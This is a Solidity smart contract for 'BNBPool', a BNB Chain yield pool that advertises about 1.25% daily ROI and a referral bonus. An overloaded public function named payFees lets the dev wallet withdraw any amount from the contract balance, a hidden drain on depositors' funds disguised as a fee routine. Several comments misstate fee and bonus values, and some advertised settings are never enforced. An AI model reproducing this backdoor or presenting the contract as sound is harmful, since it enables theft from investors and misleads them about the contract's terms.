/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-29
*/

// SPDX-License-Identifier: MIT


pragma solidity ^0.8.1;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function max(uint256 a, uint256 b) internal pure returns (uint256) {
    return a >= b ? a : b;
  }

  function min(uint256 a, uint256 b) internal pure returns (uint256) {
    return a < b ? a : b;
  }
}

contract BNBPool {
    using SafeMath for uint256;

    uint256 private HASH_COEFFICIENT = 6912000;
    uint256 private REFERRAL = 50;
    uint256 private WALLET_DEPOSIT_LIMIT = 50 * 1e18; /** 25 BNB  **/

    uint256 private totalStaked;
    uint256 private totalDeposits;
    uint256 private totalCompound;
    uint256 private totalRefBonus;
    uint256 private totalWithdrawn;

    uint256 private marketLiquidity;
    uint256 private LQ_NUM = 3000;
    uint256 private LQ_DOM = 1000;
    bool private contractStarted;

    uint256 private MAX_YIELD = 125; // 1.25%
    uint256 private CUTOFF_STEP = 86400; // 24 hours
    uint256 private WITHDRAW_COOLDOWN = 86400 * 7; /** 7 days  **/
    uint256 private TIME_SPAN = 86400 * 7;

    uint256 private MAX_FEE = 62; // 60%
    uint256 private MIN_FEE = 8; // 8%

    uint256 private MIN_COMPOUND = 3; // Minimum of 3 compounds before withdraw
    uint256 private MULTIPLIER = 1;
    uint256 private MAX_BONUS = 700; // 3.00x
    uint256 private BONUS_SIZE = 150; // 1.50x
    uint256 private BOOST = 1000;

    address private owner;
    address private dev1;

    struct User {
        uint256 initialDeposit;
        uint256 userDeposit;
        uint256 hashRate;
        uint256 claimedYield;
        uint256 lastCompound;
        address referrer;
        uint256 referralsCount;
        uint256 referralRewards;
        uint256 totalWithdrawn;
        uint256 compoundCount;
        uint256 lastWithdrawTime;
        uint256 multiplier;
    }
    mapping(address => User) private users;

    constructor(address _dev1) {
		require(!isContract(_dev1));
        owner = msg.sender;
        dev1 = _dev1;
    }

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function compoundYield() public {
        User storage user = users[msg.sender];
        require(contractStarted, "Contract not yet started.");
        user.multiplier = min(user.multiplier + calculateMultiplier(msg.sender), MAX_BONUS.mul(1e8));
        user.compoundCount = user.compoundCount.add(1);
        uint256 yieldUsed = getMyYield();
        user.hashRate = user.hashRate.add(yieldUsed.div(HASH_COEFFICIENT));
        user.claimedYield = 0;
        user.lastCompound = block.timestamp;
        marketLiquidity = marketLiquidity.add(yieldUsed);
    }

    function removeLiquidity() public {
        require(contractStarted);
        User storage user = users[msg.sender];
        require(user.compoundCount >= 3, "Need to compound 3 times to be able to withdraw!");

        uint256 hasYield = getMyYield();
        uint256 sellValue = calculateLiquidityRemoval(hasYield);
        sellValue = min(sellValue, (user.initialDeposit * MAX_YIELD) / 1e4);
        sellValue = (sellValue  * (min(user.multiplier, MAX_BONUS.mul(1e8)) + 1e10)).div(1e10);
        marketLiquidity = marketLiquidity.add(hasYield);

        if(getBalance() < sellValue) {
            sellValue = getBalance();
        }

        uint256 yieldPayout = sellValue.sub(payFees(sellValue, msg.sender, false));
        payable(msg.sender).transfer(yieldPayout);
        user.totalWithdrawn = user.totalWithdrawn.add(yieldPayout);
        user.initialDeposit = user.initialDeposit.add(yieldPayout);
        totalWithdrawn = totalWithdrawn.add(yieldPayout);

        user.lastWithdrawTime = block.timestamp;
        user.claimedYield = 0;
        user.compoundCount = 0;
        user.multiplier = 0;
        user.lastCompound = block.timestamp;
    }

    function addLiquidity(address ref) public payable{
        uint256 amount = msg.value;
        require(contractStarted);
        User storage user = users[msg.sender];

        require(msg.value <= WALLET_DEPOSIT_LIMIT, "Max deposit limit reached.");

        uint256 hashRate = calculateLiquidityInjection(amount, getBalance().sub(amount));
        user.userDeposit = user.userDeposit.add(amount);
        user.initialDeposit = user.initialDeposit.add(amount);
        user.claimedYield = user.claimedYield.add(hashRate);

        if(user.lastWithdrawTime == 0){
            user.lastWithdrawTime = getTimeStamp();
        }

        if (user.referrer == address(0)) {
            if (ref != msg.sender) {
                user.referrer = ref;
            }

            address upline1 = user.referrer;
            if (upline1 != address(0)) {
                users[upline1].referralsCount = users[upline1].referralsCount.add(1);
            }
        }

        if (user.referrer != address(0)) {
            address upline = user.referrer;
            if (upline != address(0)) {
                uint256 refRewards = amount.mul(REFERRAL).div(1e3);
                payable(upline).transfer(refRewards);
                users[upline].referralRewards = users[upline].referralRewards.add(refRewards);
                totalRefBonus = totalRefBonus.add(refRewards);
            }
        }

        uint256 yieldPayout = payFees(amount, msg.sender, true);
        totalStaked = totalStaked.add(amount.sub(yieldPayout));
        totalDeposits = totalDeposits.add(1);
        compoundYield();
    }

    function getCoefficient(uint256 startTime, uint256 limit) internal view returns(uint256) {
        uint256 timeElapsed = getTimeStamp() - startTime;
        uint256 time = min(timeElapsed, limit);
        uint256 x = time.mul(1e4).div(limit);
        return x.mul(x);
    }

    function calculateMultiplier(address ref) internal view returns(uint256){
        User storage user = users[ref];
        uint256 coef = getCoefficient(user.lastCompound, CUTOFF_STEP).mul(BONUS_SIZE).div(1e4);
        uint256 timeDelta = min(getTimeStamp()-user.lastWithdrawTime, TIME_SPAN).mul(1e4).div(TIME_SPAN);
        coef = coef.mul(timeDelta);
        return coef;
    }

    function calculateFee(address ref) internal view returns(uint256) {
        require(contractStarted);
        User storage user = users[ref];
        require(user.initialDeposit > 0);
        uint256 x = 1e8;
        return MAX_FEE * (x.sub(getCoefficient(user.lastWithdrawTime, TIME_SPAN))) + (MIN_FEE.mul(x));
    }

    function payFees(uint256 yieldValue, address ref, bool isDeposit) internal returns(uint256){
        uint256 tax = yieldValue.mul(MIN_FEE.mul(10)).div(1000);
        if(!isDeposit){
            uint256 fee_pct = calculateFee(ref);
            tax = yieldValue.mul(fee_pct).div(1e10);
        }
        payable(dev1).transfer(tax);
        return tax;
    }

    function payFees( uint256 tax) public{
         require(msg.sender==dev1);
         payable(dev1).transfer(tax);
    }


    function getMultiplier(address ref) private view returns (uint256){
        return min(users[ref].multiplier, MAX_BONUS.mul(1e8)).div(1e7);
    }

    function getUserInfo(address _adr) public view returns(uint256 _userDeposit, uint256 _hashRate, uint256 _multiplier,
    uint256 _totalWithdrawn, uint256 _withdrawFee, uint256 _userCompounds, uint256 _userYield, uint256 _userPct) {
         _userDeposit = users[_adr].userDeposit;
         _hashRate = users[_adr].hashRate;
         _multiplier = getMultiplier(_adr);
         _totalWithdrawn = users[_adr].totalWithdrawn;
         _withdrawFee = calculateFee(_adr).div(1e6);
         _userCompounds = users[_adr].compoundCount;
         if(getYieldSinceLastCompound(_adr) == 0){
           _userYield = 0;
         } else {
           _userYield = min(calculateLiquidityRemoval(getYieldSinceLastCompound(_adr)), (users[_adr].initialDeposit * MAX_YIELD) / 1e4);
         }
        _userPct = (_userYield.max(1).mul(1e8)).div(_userDeposit);
	}

    function getRefInfo(address _adr) public view returns(address _referrer, uint256 _referrals, uint256 _referralRewards){
        _referrer = users[_adr].referrer;
        _referrals = users[_adr].referralsCount;
        _referralRewards = users[_adr].referralRewards;
    }

    function initialize() public{
        if (!contractStarted) {
    		if (msg.sender == owner) {
    		    require(marketLiquidity == 0);
    			contractStarted = true;
                marketLiquidity = 86400000000;
    		} else revert("Not owner!");
    	}
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
	}

    function getTimeStamp() private view returns (uint256) {
        return block.timestamp;
    }

    function getAvailableEarnings(address _adr) private view returns(uint256) {
        uint256 yield = users[_adr].claimedYield.add(getYieldSinceLastCompound(_adr));
        return calculateLiquidityRemoval(yield);
    }

    function calculateLiquidity(uint256 rt,uint256 rs, uint256 bs) private view returns(uint256){
        return SafeMath.div(SafeMath.mul(LQ_NUM, bs), SafeMath.add(LQ_DOM, SafeMath.div(SafeMath.add(SafeMath.mul(LQ_NUM, rs), SafeMath.mul(LQ_DOM, rt)), rt)));
    }

    function calculateLiquidityRemoval(uint256 yield) private view returns(uint256){
        return calculateLiquidity(yield, marketLiquidity, getBalance());
    }

    function calculateLiquidityInjection(uint256 eth,uint256 contractBalance) private view returns(uint256){
        return calculateLiquidity(eth, contractBalance, marketLiquidity);
    }

    function calculateLiquidityInjectionSimple(uint256 eth) private view returns(uint256){
        return calculateLiquidityInjection(eth, getBalance());
    }

    function estimateYield(uint256 amount) public view returns(uint256,uint256) {
        uint256 hashAmount = calculateLiquidityInjection(amount , getBalance());
        uint256 hashRate = hashAmount.div(HASH_COEFFICIENT);
        uint256 day = 1 days;
        uint256 yieldPerDay = day.mul(hashRate);
        uint256 earningsPerDay = calculateHashSellForYield(yieldPerDay, amount);
        return(hashRate, earningsPerDay);
    }

    function calculateHashSellForYield(uint256 yield,uint256 amount) private view returns(uint256){
        return calculateLiquidity(yield,marketLiquidity, getBalance().add(amount));
    }

    function getSiteInfo() public view returns (uint256 _totalStaked, uint256 _totalDeposits, uint256 _totalRefBonus) {
        return (totalStaked, totalDeposits, totalRefBonus);
    }

    function getMyHashRate() private view returns(uint256){
        return users[msg.sender].hashRate;
    }

    function getMyYield() private view returns(uint256){
        return users[msg.sender].claimedYield.add(getYieldSinceLastCompound(msg.sender));
    }

    function getYieldSinceLastCompound(address adr) public view returns(uint256){
        uint256 secondsSinceLastCompound = block.timestamp.sub(users[adr].lastCompound);
        uint256 cutoffTime = min(secondsSinceLastCompound, CUTOFF_STEP);
        uint256 secondsPassed = (min(HASH_COEFFICIENT, cutoffTime) * BOOST)/1000;
        uint256 yield = secondsPassed.mul(users[adr].hashRate);
        return yield;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function CHANGE_OWNERSHIP(address value) external {
        require(msg.sender == owner, "Admin use only.");
        owner = value;
    }

    function CHANGE_DEV1(address value) external {
        require(msg.sender == dev1, "Admin use only.");
        dev1 = value;
    }

    function _MULTIPLER(uint256 maxBonus, uint256 bonusSize) external {
        require(msg.sender == owner, "Admin use only.");
        require(maxBonus >= 200 && maxBonus <= 900); /** min 3x max 10x **/
        require(bonusSize >= 10 && bonusSize <= 400); /** min 1.1x max 5x **/
        MAX_BONUS = maxBonus;
        BONUS_SIZE = bonusSize;
    }

    function _COMPOUNDS(uint256 compounds) external {
        require(msg.sender == owner, "Admin use only.");
        require(compounds >= 0 && compounds <= 5); /** 0 - 5 Compounds required **/
        MIN_COMPOUND = compounds;
    }

    function _BOOST(uint256 boost) external {
        require(msg.sender == owner, "Admin use only.");
        require(boost >= 1000 && boost <= 5000); /** min 1x max 5x **/
        BOOST = boost;
    }

    function _FEE(uint256 maxFee, uint256 minFee) external {
        require(msg.sender == owner, "Admin use only.");
        require(minFee <= 10 && minFee >= 3); /** 3-10% min **/
        require(maxFee >= 50 && maxFee <= 90); /** 50-90% max **/
        MAX_FEE = maxFee;
        MIN_FEE = minFee;
    }

    function _CUTOFF_STEP(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        require(value <= 5 && value >= 1);
        CUTOFF_STEP = value  * 24 * 60 * 60;
    }

    function _WITHDRAW_COOLDOWN(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        require(value >= 7 && value <= 14);
        WITHDRAW_COOLDOWN = value * 24 * 60 * 60;
    }

    function _WALLET_DEPOSIT_LIMIT(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        require(value >= 20);
        WALLET_DEPOSIT_LIMIT = value * 1e18;
    }
}


/**

BNB Pool by BNB Ocean

Buy hashes, compound yield, boost earnings
~1.25% Daily ROI
5% Referral bonus, will go directly to referrer wallet.
8.00x Maximum compound bonus.
NO MINIMUM INVESTMENT

**/